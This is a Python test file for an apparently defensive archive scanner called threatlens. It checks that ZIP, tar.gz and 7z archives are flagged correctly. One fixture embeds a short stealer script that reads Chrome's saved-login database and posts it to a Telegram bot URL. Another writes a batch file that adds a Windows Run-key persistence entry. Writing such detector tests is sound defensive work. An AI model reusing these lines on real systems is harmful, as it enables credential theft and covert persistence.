"""Tests for archive analysis (ZIP, 7z, tar.gz)."""

import os
import io
import zipfile
import tarfile
import tempfile
import pytest
from threatlens.core import analyze_file


class TestZIP:
    def test_zip_with_stealer(self, tmp_file):
        p = tempfile.mktemp(suffix=".zip")
        with zipfile.ZipFile(p, "w") as z:
            z.writestr("safe.txt", "hello world")
            z.writestr("hack.py", "import requests\nchrome='AppData\\\\Google\\\\Chrome\\\\User Data\\\\Login Data'\nrequests.post('https://api.telegram.org/bot/send', data={'f': open(chrome).read()})")
        try:
            r = analyze_file(p, use_cache=False)
            assert any("DANGEROUS" in f for f in r.findings)
        finally:
            os.unlink(p)

    def test_zip_safe(self, tmp_file):
        p = tempfile.mktemp(suffix=".zip")
        with zipfile.ZipFile(p, "w") as z:
            z.writestr("readme.txt", "hello")
            z.writestr("config.json", '{"key": "value"}')
        try:
            r = analyze_file(p, use_cache=False)
            assert not any("DANGEROUS" in f for f in r.findings)
        finally:
            os.unlink(p)

    def test_corrupted_zip(self, tmp_file):
        p = tmp_file(b"PK\x03\x04" + b"\xff" * 100, suffix=".zip")
        r = analyze_file(p, use_cache=False)
        # Should not crash
        assert r.risk_score >= 0


class TestTarGz:
    def test_targz_with_batch(self):
        p = tempfile.mktemp(suffix=".tar.gz")
        with tarfile.open(p, "w:gz") as tf:
            data = b"@echo off\r\nreg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v test /d test.exe\r\n"
            info = tarfile.TarInfo(name="install.bat")
            info.size = len(data)
            tf.addfile(info, io.BytesIO(data))
        try:
            r = analyze_file(p, use_cache=False)
            assert any("DANGEROUS" in f for f in r.findings)
        finally:
            os.unlink(p)


class Test7z:
    def test_7z_basic(self):
        try:
            import py7zr
        except ImportError:
            pytest.skip("py7zr not installed")

        p = tempfile.mktemp(suffix=".7z")
        with py7zr.SevenZipFile(p, "w") as z:
            z.writestr(b"safe content", "readme.txt")
        try:
            r = analyze_file(p, use_cache=False)
            assert r.risk_score >= 0
        finally:
            os.unlink(p)
